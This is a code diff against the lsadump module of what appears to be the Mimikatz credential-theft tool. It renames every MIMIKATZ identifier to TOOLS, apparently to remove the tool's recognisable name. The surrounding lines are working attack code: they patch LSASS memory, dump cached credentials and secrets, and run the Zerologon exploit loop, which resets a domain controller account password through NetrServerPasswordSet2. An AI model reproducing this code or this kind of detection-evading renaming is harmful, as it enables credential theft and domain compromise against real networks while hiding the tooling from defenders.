@@ -141,7 +141,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 				}
 				if(!cacheData.isNtlm)
 				{
-					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+					kull_m_string_args_byName(argc, argv, L"password", &szPassword, TOOLS);
 					kprintf(L"  * password : %s\n", szPassword);
 					RtlInitUnicodeString(&uPassword, szPassword);
 					cacheData.isNtlm = NT_SUCCESS(RtlCalculateNtOwfPassword(&uPassword, cacheData.ntlm));
@@ -1334,7 +1334,7 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), TOOLS_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
 			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
@@ -1730,14 +1730,14 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), TOOLS_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentReference->Search.Pattern;
 			aPatchMemory.address = currentReference->Patch.Pattern;
 
 			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
 			{
-				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
 				{
 					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
 					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
@@ -2028,7 +2028,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 		{
 			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
-			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
+			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, TOOLS);
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
 			{
 				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
@@ -2498,10 +2498,10 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 					{
 						for(i = 0; i < 2000; i++)
 						{
-							status = NetrServerReqChallenge(NULL, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
+							status = NetrServerReqChallenge(NULL, TOOLS, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
 							if(status == STATUS_SUCCESS)
 							{
-								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
+								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, TOOLS, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
 								if(status == STATUS_SUCCESS)
 								{
 									bIsAuth = TRUE;
@@ -2509,7 +2509,7 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 									if(bExploit)
 									{
 										kprintf(L"\n");
-										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
+										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, TOOLS, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
 										if(status == STATUS_SUCCESS)
 										{
 											bIsChanged = TRUE;
